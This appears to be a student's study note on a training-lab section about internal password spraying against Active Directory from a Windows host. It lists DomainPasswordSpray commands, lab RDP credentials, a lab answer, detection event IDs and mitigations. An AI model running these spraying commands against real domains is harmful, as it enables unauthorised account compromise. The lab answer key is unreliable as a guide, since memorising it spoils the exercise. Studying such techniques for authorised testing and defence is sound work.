# NOTE — Internal Password Spraying - from Windows

## ID
531

## Module
Active Directory Enumeration & Attacks

## Kind
notes

## Title
Section 12 — Internal Password Spraying - from Windows

## Description
Covers internal password spraying from a domain-joined Windows host using DomainPasswordSpray.ps1, which auto-generates user lists and respects lockout policies, plus mitigations and detection strategies.

## Tags
password-spraying, domainpasswordspray, powershell, active-directory, windows

## Commands
- `xfreerdp /u:htb-student /p:Academy_student_AD! /v:<TARGET_IP> /cert-ignore /bpp:8 /network:modem /compression -themes -wallpaper /clipboard /audio-mode:1 /auto-reconnect -glyph-cache /dynamic-resolution`
- `Import-Module .\DomainPasswordSpray.ps1`
- `Invoke-DomainPasswordSpray -Password <PASSWORD> -OutFile spray_success -ErrorAction SilentlyContinue`

## What This Section Covers
When spraying from a domain-joined Windows host, DomainPasswordSpray.ps1 is the go-to tool — it auto-generates a user list from AD, queries the domain password policy, and excludes accounts near lockout. This section also covers mitigations (MFA, least privilege, password hygiene, LAPS) and detection via Event IDs 4625 and 4771.

## Methodology
1. RDP into the Windows attack host.
2. Open PowerShell and navigate to the Tools directory: `cd C:\Tools`
3. Import the module: `Import-Module .\DomainPasswordSpray.ps1`
4. Run the spray — no `-UserList` flag needed on a domain-joined host, the tool builds one automatically: `Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue`
5. Confirm with `Y` when prompted. Read results from console or from the `spray_success` output file.

## Step-by-Step Lab Walkthrough

### 1. RDP into the target
```
xfreerdp /u:htb-student /p:Academy_student_AD! /v:10.129.17.61 /cert-ignore /bpp:8 /network:modem /compression -themes -wallpaper /clipboard /audio-mode:1 /auto-reconnect -glyph-cache /dynamic-resolution
```

### 2. Open PowerShell and navigate to Tools
```
cd C:\Tools
```

### 3. Import DomainPasswordSpray and run the spray
```
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
```
Confirm with `Y` when prompted. The tool auto-generates the user list from AD (no need to supply `valid_users.txt` on a domain-joined host), queries lockout policy, and removes at-risk accounts.

### 4. Read the output
```
[*] SUCCESS! User:dbranch Password:Winter2022
```
Answer: **dbranch**

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Find a user with the password Winter2022 | dbranch | `Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue` — auto-generated user list from AD |

## Key Takeaways
- On a domain-joined Windows host, DomainPasswordSpray auto-generates the user list from AD — no need to manually supply one. This is a big advantage over the Linux approach.
- The tool automatically queries the domain password policy and removes accounts within 1 attempt of lockout — built-in safety net.
- Detection: Event ID 4625 (failed logon) for SMB spraying, Event ID 4771 (Kerberos pre-auth failed) for LDAP spraying — both require correlation of many events in a short window.
- External password spraying targets include O365, OWA, VPN portals, Citrix, RDS — all worth trying with valid creds found internally.
- Mitigations to note in reports: MFA, least privilege access, network segmentation, password filters blocking common words/seasons/company name variations.

## Gotchas
- Even though the tool has lockout protection, a very restrictive lockout policy (e.g., 3 attempts) combined with other concurrent activity could still cause lockouts — always check the policy first.
- Don't assume you need to transfer a user list to the Windows host — the whole point of DomainPasswordSpray on a domain-joined machine is that it builds the list for you.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|ad-enum-attacks]]  
← [[11-internal-password-spraying-linux]] | [[13-enumerating-security-controls]] →
<!-- AUTO-LINKS-END -->
